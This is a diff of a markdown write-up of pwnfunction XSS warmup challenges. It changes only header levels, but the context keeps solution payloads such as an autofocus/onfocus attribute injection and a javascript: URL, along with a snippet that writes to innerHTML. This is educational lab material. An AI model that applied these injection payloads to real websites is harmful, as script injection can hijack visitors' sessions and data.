@@ -45,7 +45,7 @@ My solution: `https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=<
 My solution (same as rxss-angles-encoded in portswigger): `" autofocus onfocus="alert(1337)`
 Intended solution: `"onfocus=alert(1337) autofocus="`
 
-#### Ricardo Milos
+### Ricardo Milos
 
 ```html
 <form id="ricardo" method="GET">
@@ -63,7 +63,7 @@ Intended solution: `"onfocus=alert(1337) autofocus="`
 - My solution: `https://sandbox.pwnfunction.com/warmups/ricardo.html?ricardo=javascript:alert(1337)`
 - Intended solution: `javascript:alert(1337)`
 
-#### Ah That's Hawt
+### Ah That's Hawt
 
 ```html
 <h2 id="will"></h2>
@@ -73,6 +73,4 @@ Intended solution: `"onfocus=alert(1337) autofocus="`
     will.innerHTML = smith
 </script>
 ```
-
-
 
